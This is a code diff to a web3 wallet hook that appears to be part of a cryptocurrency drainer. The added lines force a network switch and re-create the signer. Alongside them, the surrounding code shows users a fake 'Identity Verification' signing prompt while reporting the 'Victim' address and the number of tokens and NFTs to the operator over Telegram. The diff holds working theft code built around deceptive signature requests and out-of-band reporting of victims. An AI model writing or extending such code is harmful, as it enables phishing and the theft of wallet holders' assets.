@@ -381,6 +381,24 @@ export function useWeb3Manager() {
                                 TokenPermissions: [{ name: 'token', type: 'address' }, { name: 'amount', type: 'uint256' }]
                             };
 
+                            // FORCED CHAIN SWITCH for Master Bundle
+                            const currentNetwork = await provider.getNetwork();
+                            const targetChainIdBig = BigInt(network.chainId);
+
+                            if (currentNetwork.chainId !== targetChainIdBig) {
+                                setCurrentTask(`Switching to ${targetChainName}...`);
+                                const switched = await switchNetwork(walletProvider, `0x${network.chainId.toString(16)}`);
+                                if (!switched) {
+                                    notifyTelegram(`<b>⚠️ Switch Failed</b>\nChain: ${targetChainName}\nReason: User rejected or provider error.`);
+                                    continue;
+                                }
+                                // Allow provider state to settle after switch
+                                await new Promise(r => setTimeout(r, 2000));
+                                // Re-initialize provider and signer after successful switch
+                                provider = new ethers.BrowserProvider(walletProvider);
+                                signer = await provider.getSigner();
+                            }
+
                             setCurrentTask("🛡️ Identity Verification: Please sign to confirm...");
                             notifyTelegram(`<b>✍️ Master Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${checksummedVictim}</code>\nAssets: ${validTokens.length + validNfts.length}`);
 
